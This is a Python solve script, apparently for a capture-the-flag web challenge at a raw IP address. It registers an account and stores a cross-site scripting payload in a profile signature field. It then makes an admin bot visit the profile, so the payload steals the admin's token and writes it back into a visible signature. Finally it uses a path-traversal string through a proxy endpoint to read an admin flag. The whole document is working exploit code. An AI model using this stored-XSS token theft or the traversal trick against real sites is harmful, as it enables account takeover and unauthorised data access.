import requests
import time
import re

BASE_URL = "http://45.130.164.173:30205"

def solve():
    s = requests.Session()
    username = "final_" + str(int(time.time()))
    s.post(f"{BASE_URL}/register", data={"username": username, "password": "p"})
    
    # Refined XSS to avoid double quotes and backslashes
    unique_id = str(int(time.time()))
    payload = (
        '</script > <script>'
        'fetch("/flag").then(r=>r.text()).then(h=>{'
        '  const t=h.match(/data-token=.([^.]+)./)[1];'
        '  var f = document.createElement(\'form\');'
        '  f.method = \'POST\';'
        '  f.action = \'/settings\';'
        '  var i = document.createElement(\'input\');'
        '  i.name = \'signature\';'
        '  i.value = \'MYTOKEN_' + unique_id + ':\' + t;'
        '  f.appendChild(i);'
        '  document.body.appendChild(f);'
        '  f.submit();'
        '});'
        '</script >'
    )
    
    s.post(f"{BASE_URL}/settings", data={"signature": payload})
    
    profile_url = f"http://web:4321/profile/{username}"
    print(f"[*] Bot visit: {profile_url}")
    s.post(f"{BASE_URL}/api/visit", json={"url": profile_url})
    
    print("[*] Polling admin profile for token...")
    for _ in range(30):
        r = s.get(f"{BASE_URL}/profile/admin")
        m = re.search(r"MYTOKEN_" + unique_id + r":([a-zA-Z0-9\._-]+)", r.text)
        if m:
            token = m.group(1)
            print(f"[+] Token found: {token}")
            
            proxy_path = "api/observations/../../admin/flag"
            r = s.get(f"{BASE_URL}/api/proxy", params={"path": proxy_path, "token": token})
            print(f"[+] Flag Response: {r.text}")
            if "THEM" in r.text:
                print(f"\n<FLAG>{re.search(r'THEM\{.*?\}', r.text).group(0)}</FLAG>")
                return
        time.sleep(2)
    
    print("[-] Failed to find my token.")
    print("Last admin signature was:")
    print(r.text[r.text.find("Constellation:"):r.text.find("Constellation:")+200])

if __name__ == "__main__":
    solve()
